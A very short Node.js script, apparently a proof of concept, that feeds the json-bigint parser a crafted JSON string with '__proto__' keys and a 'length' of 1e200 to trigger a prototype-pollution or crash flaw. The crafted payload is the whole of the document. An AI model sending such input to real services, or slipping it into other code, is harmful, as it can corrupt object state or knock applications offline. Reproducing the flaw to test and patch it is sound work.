const JSONbig = require("json-bigint");
const json =
  '{"__proto__":1000000000000000,"c":{"__proto__":[],"length":1e200}}';
const r = JSONbig.parse(json);
console.log(r.toString());
